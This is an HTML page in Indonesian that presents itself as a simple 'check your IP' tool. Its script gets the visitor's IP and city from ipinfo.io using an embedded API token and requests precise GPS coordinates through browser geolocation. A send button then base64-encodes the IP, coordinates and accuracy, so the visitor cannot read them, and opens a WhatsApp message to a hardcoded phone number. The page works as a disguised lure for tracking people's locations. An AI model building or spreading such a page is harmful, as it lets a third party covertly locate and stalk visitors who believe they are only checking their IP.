<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pengecek IP</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 50px;
            text-align: center;
        }
        #ip-display {
            font-size: 18px;
            margin: 20px 0;
            font-weight: bold;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            margin-top: 10px; /* Tambahkan jarak atas untuk tombol */
        }
        #send-wa {
            display: none; /* Sembunyikan tombol kirim awalnya */
        }
    </style>
</head>
<body>
    <h1>Cek IP</h1>
    <p>Tekan tombol dibawah untuk mengecek IP kamu.</p>
    <div id="ip-display">Your IP: </div>
    <button id="check-ip" onclick="getAccurateLocation()">Check IP</button>
    <button id="send-wa" onclick="sendToWhatsApp()">[ Kirimkan IP ]</button>

    <script>
        let locationData = {};

        async function getAccurateLocation() {
            const ipDisplay = document.getElementById('ip-display');
            const checkButton = document.getElementById('check-ip');
            const sendButton = document.getElementById('send-wa');

            try {
                // Step 1: Fetch IP and Location from IP Info API
                const response = await fetch('https://ipinfo.io/json?token=6d8519218e7b69');
                if (!response.ok) throw new Error('Failed to fetch IP information.');
                const ipInfo = await response.json();

                // Set initial data
                locationData = {
                    ip: ipInfo.ip,
                    city: ipInfo.city,
                    region: ipInfo.region,
                    country: ipInfo.country,
                    loc: ipInfo.loc, // Default location from IP
                };

                ipDisplay.textContent = `Your IP: ${locationData.ip}`;

                // Step 2: Use Geolocation API for Accurate Location
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Update location data with precise GPS coordinates
                        locationData.loc = `${position.coords.latitude},${position.coords.longitude}`;
                        locationData.accuracy = position.coords.accuracy;

                        // Update UI: hide Check IP button and show Send WhatsApp button
                        checkButton.style.display = 'none';
                        sendButton.style.display = 'inline-block';
                    },
                    (error) => {
                        console.error('Permission for accurate location denied. Using IP-based location.');
                        // Fallback to IP location
                        checkButton.style.display = 'none';
                        sendButton.style.display = 'inline-block';
                    }
                );
            } catch (err) {
                ipDisplay.textContent = 'Error fetching IP data.';
                console.error(err);
            }
        }

        function sendToWhatsApp() {
            const encodedMessage = btoa(
                `IP: ${locationData.ip}\nLocation: ${locationData.city}, ${locationData.region}, ${locationData.country}\nCoordinates: ${locationData.loc}\nAccuracy: ${locationData.accuracy || 'N/A'} meters`
            );

            const whatsappURL = `https://wa.me/6287713740114?text=${encodeURIComponent(encodedMessage)}`;
            window.open(whatsappURL, '_blank');
        }
    </script>
</body>
</html
